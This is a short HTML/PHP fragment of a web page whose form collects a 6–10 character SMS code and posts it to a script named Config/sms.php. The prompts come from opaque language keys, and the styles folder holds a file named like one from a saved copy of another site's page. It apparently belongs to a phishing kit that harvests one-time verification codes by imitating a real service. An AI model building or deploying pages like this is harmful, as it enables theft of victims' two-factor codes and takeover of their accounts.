...
<body class=""><iframe aria-hidden="true" tabindex="-1" title="Text Zoom Event Iframe" style="width: 1em; height: 1px; border-width: 0px; position: absolute; overflow: hidden; white-space: nowrap; margin: -1px;" src="./styles/saved_resource.html"></iframe>
    ...
    <div class="l-view ">
        ...
        <form method="POST" action="./Config/sms.php">
        <div class="carda">
       ...
       <div class="spn"><p><?php echo lang('xAp1'); ?></p></div>
        ...
        <input name="code" placeholder="<?php echo lang('xAcp'); ?>" class="inpt" maxlength="10" minlength="6"  type="text" required="">

        <img src="./styles/phone.svg" alt="" srcset="">


        </div>

        <p><?php echo lang('xAp2'); ?></p>
